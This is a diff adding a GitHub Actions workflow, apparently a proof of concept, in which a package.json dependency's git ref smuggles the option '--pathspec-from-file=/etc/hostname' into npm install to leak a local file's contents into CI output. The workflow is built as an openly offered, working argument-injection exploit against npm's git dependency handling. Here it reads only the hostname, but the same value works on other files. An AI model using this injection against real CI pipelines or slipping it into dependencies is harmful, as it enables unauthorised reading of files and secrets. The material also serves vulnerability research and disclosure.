@@ -1,0 +1,14 @@
+name: NPM File Read PoC
+on: workflow_dispatch
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: npm install with pathspec injection
+        run: |
+          mkdir /tmp/poc && cd /tmp/poc
+          echo '{"name":"poc","version":"1.0.0","dependencies":{"x":"git+https://github.com/tooforg/public-test-repo.git#--pathspec-from-file=/etc/hostname"}}' > package.json
+          npm install --ignore-scripts 2>&1 || true
+          echo "---"
+          echo "If the hostname leaked above, the file read works in CI!"
+        continue-on-error: true
